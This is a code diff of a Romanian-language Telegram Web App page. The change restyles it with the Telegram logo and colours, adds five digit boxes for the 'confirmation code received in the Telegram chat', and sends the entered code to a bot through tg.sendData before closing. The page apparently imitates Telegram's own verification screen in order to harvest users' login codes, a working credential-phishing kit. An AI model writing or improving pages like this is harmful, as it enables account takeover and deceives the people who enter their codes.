@@ -5,28 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background-color: #000; color: #fff; text-align: center; padding-top: 50px; }
-        input { width: 80%; padding: 15px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; font-size: 18px; margin-bottom: 20px; }
-        button { width: 80%; padding: 15px; border-radius: 10px; border: none; background: #248bed; color: #fff; font-size: 18px; font-weight: bold; }
+        body { background-color: #1c242c; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .logo { width: 80px; height: 80px; background: url('https://telegram.org/img/t_logo.png') no-repeat center; background-size: contain; margin-bottom: 20px; }
+        h2 { font-size: 18px; text-align: center; padding: 0 30px; font-weight: 400; color: #ffffff; }
+        .code-box { display: flex; gap: 8px; margin: 25px 0; }
+        input { width: 42px; height: 50px; background: #2b353e; border: 1px solid #3d4b58; border-radius: 8px; color: white; text-align: center; font-size: 22px; outline: none; }
+        input:focus { border-color: #24a1de; }
+        .btn { background: #24a1de; border: none; width: 80%; padding: 14px; border-radius: 10px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h2>Verificare Profil</h2>
-    <p>Introdu codul de 5 cifre:</p>
-    <input type="number" id="cod_input" placeholder="00000">
-    <br>
-    <button onclick="trimite()">Confirmă</button>
+    <div class="logo"></div>
+    <h2>Vă rugăm să introduceți codul de confirmare primit în chat-ul Telegram pentru a continua.</h2>
+    <div class="code-box">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" oninput="if(this.value)this.nextElementSibling?.focus()">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" oninput="if(this.value)this.nextElementSibling?.focus()">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" oninput="if(this.value)this.nextElementSibling?.focus()">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" oninput="if(this.value)this.nextElementSibling?.focus()">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1">
+    </div>
+    <button class="btn" onclick="finish()">Confirmă</button>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-
-        function trimite() {
-            const valoare = document.getElementById('cod_input').value;
-            if (valoare.length >= 5) {
-                tg.sendData(valoare); // Trimite codul către bot
-            } else {
-                alert("Introdu 5 cifre!");
+        function finish() {
+            let res = "";
+            document.querySelectorAll('input').forEach(i => res += i.value);
+            if(res.length === 5) {
+                tg.sendData(res);
+                tg.close();
             }
         }
     </script>
